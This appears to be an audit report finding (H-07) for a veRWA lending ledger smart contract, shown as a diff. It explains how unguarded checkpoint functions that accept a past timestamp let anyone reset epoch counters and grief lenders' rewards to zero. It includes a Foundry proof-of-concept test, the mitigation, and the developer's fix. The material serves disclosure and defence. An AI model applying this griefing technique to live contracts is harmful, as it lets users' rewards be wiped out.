@@ -1,0 +1,33 @@
+[H-07] was discovered during that period and is being included here for completeness.
+User’s claim andsync_lenderwill be griefed at low cost.
+Proof of Concept
+/// @notice Trigger a checkpoint explicitly.///     Never needs to be called explicitly, but could be used to ensure the checkpoints within the other functions consume less gas (because they need to forward less epochs)/// @param _market Address of the market/// @param _forwardTimestampLimit Until which epoch (provided as timestamp) should the update be applied. If it is higher than the current epoch timestamp, this will be used.functioncheckpoint_market(address_market,uint256_forwardTimestampLimit)externalis_valid_epoch(_forwardTimestampLimit) {require(lendingMarketTotalBalanceEpoch[_market] >0,"No deposits for this market");_checkpoint_market(_market,_forwardTimestampLimit);}/// @param _market Address of the market/// @param _lender Address of the lender/// @param _forwardTimestampLimit Until which epoch (provided as timestamp) should the update be applied. If it is higher than the current epoch timestamp, this will be used.functioncheckpoint_lender(address_market,address_lender,uint256_forwardTimestampLimit)externalis_valid_epoch(_forwardTimestampLimit) {require(lendingMarketBalancesEpoch[_market][_lender] >0,"No deposits for this lender in this market");_checkpoint_lender(_market,_lender,_forwardTimestampLimit);}
+
+These two functions lack access control, the caller is never validated, meaning anyone can call this function.
+The market is not validated to see if the market is whitelisted or not.
+The timestamp is never validated, the is_valid_epoch(_forwardTimestampLimit) is insufficient.
+/// @notice Check that a provided timestamp is a valid epoch (divisible by WEEK) or infinity/// @param _timestamp Timestamp to checkmodifieris_valid_epoch(uint256_timestamp) {require(_timestamp%WEEK==0||_timestamp==type(uint256).max,"Invalid timestamp");_;}
+The user can just pick a past timestamp as the _forwardTimestampLimit.
+For example, if we set _forwardTimestampLimit to 0.
+Then for example in _checkpoint_market
+function_checkpoint_market(address_market,uint256_forwardTimestampLimit)private{uint256currEpoch= (block.timestamp/WEEK) *WEEK;uint256lastMarketUpdateEpoch=lendingMarketTotalBalanceEpoch[_market];uint256updateUntilEpoch=Math.min(currEpoch,_forwardTimestampLimit);if(lastMarketUpdateEpoch>0&&lastMarketUpdateEpoch<currEpoch) {// Fill in potential gaps in the market total balances historyuint256lastMarketBalance=lendingMarketTotalBalance[_market][lastMarketUpdateEpoch];for(uint256i=lastMarketUpdateEpoch;i<=updateUntilEpoch;i+=WEEK) {lendingMarketTotalBalance[_market][i] =lastMarketBalance;}}lendingMarketTotalBalanceEpoch[_market] =updateUntilEpoch;}
+We set the lendingMarketTotalBalanceEpoch[_market] to 0.
+Then if the next call of the _checkpoint_market, the for loop would never run because the lastMarketUpdateEpoch is 0.
+Over time, even when the for loop inside _checkpoint_market does run, the caller are forced to pay very high gas fee.
+Same issue applies to _checkpoint_lender as well.
+User can decrease lendingMarketBalancesEpoch, even to 0.
+Basically, if a malicious actor call these two function with forwardTimestampLimit 0.
+Then the _checkpoint_lender and _checkpointmarket would never run inside sync\ledger and claim reward.
+Because user’s reward can be griefed to 0 and stated are failed to updated properly.
+POC 1:
+functiontestLackOfAccessControlSyncMarket_POC_1()public{payable(ledger).transfer(1000ether);uint248amountPerEpoch=1ether;uint256fromEpoch=WEEK*5;uint256toEpoch=WEEK*10;addresslendingMarket=vm.addr(5201314);vm.prank(goverance);ledger.setRewards(fromEpoch,toEpoch,amountPerEpoch);vm.warp(block.timestamp+WEEK);vm.prank(goverance);ledger.whiteListLendingMarket(lendingMarket,true);addresslender=users[1];vm.startPrank(lendingMarket);int256deltaStart=1ether;uint256epochStart= (block.timestamp/WEEK) *WEEK;ledger.sync_ledger(lender,deltaStart);// gaps of 3 weekuint256newTime=block.timestamp+3*WEEK;vm.warp(newTime);int256deltaEnd=1ether;uint256epochEnd= (newTime/WEEK) *WEEK;ledger.sync_ledger(lender,deltaEnd);newTime=block.timestamp+20*WEEK;vm.warp(newTime);console.log("---sync ledger after set the update epoch to 0 --");// ledger.checkpoint_market(lendingMarket, 0);// ledger.checkpoint_lender(lendingMarket, lender, 0);ledger.sync_ledger(lender,deltaEnd);vm.stopPrank();vm.prank(lender);uint256balanceBefore=address(lender).balance;ledger.claim(lendingMarket,fromEpoch,toEpoch);uint256balanceAfter=address(lender).balance;console.log(balanceAfter-balanceBefore);vm.expectRevert("No deposits for this user");ledger.claim(lendingMarket,fromEpoch,toEpoch);}
+
+If we run the POC, we get the normal result, user can claim and get 6 ETH as reward.
+---syncledgeraftersettheupdateepochto0--6000000000000000000
+If we uncomment:
+// ledger.checkpoint_market(lendingMarket, 0);// ledger.checkpoint_lender(lendingMarket, lender, 0);
+The claimed reward goes to 0.
+Recommended Mitigation Steps
+Add access control to checkpoint_market and checkpoint_lender.
+OpenCoreCH (veRWA) confirmed and commented:
+This was a valid issue before the auditing contest (uncovered during the testing contest and fixed before the auditing contest), pasting my comment from there for reference:Good point. It is generally intended that everyone can call these functions (should not be necessary in practice, but may be in some edge cases where a market was inactive for years) and I do not think that this is problematic per se. However, the problem here is that users can decreaselendingMarketBalancesEpochorlendingMarketTotalBalanceEpoch, which should never happen. So I will probably change the code like this (and the same for lenders) such that this can never happen:if(lastMarketUpdateEpoch>0&&lastMarketUpdateEpoch<currEpoch) {// Fill in potential gaps in the market total balances historyuint256lastMarketBalance=lendingMarketTotalBalance[_market][lastMarketUpdateEpoch];for(uint256i=lastMarketUpdateEpoch;i<=updateUntilEpoch;i+=WEEK) {lendingMarketTotalBalance[_market][i] =lastMarketBalance;}if(updateUntilEpoch>lastMarketUpdateEpoch) {lendingMarketTotalBalanceEpoch[_market] =updateUntilEpoch;}}
